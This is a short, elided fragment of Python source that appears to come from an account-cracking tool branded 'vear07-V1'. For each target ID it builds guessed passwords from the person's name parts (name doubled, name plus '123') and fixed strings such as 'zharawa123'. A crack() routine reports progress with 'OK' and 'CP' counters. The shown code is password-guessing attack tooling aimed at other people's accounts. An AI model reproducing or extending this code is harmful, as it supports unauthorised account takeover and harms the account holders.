		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(nmf)
					pwv.append(frs+frs)
					pwv.append("zharawa123")
					pwv.append("zharawa1234")
					pwv.append("zharawa12345")
					pwv.append("zharawa")
					pwv.append("zharawa123")
					pwv.append("zharawa1234")
					pwv.append(frs+'123')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r ✓ vear07-V1 ✓ {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%})'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
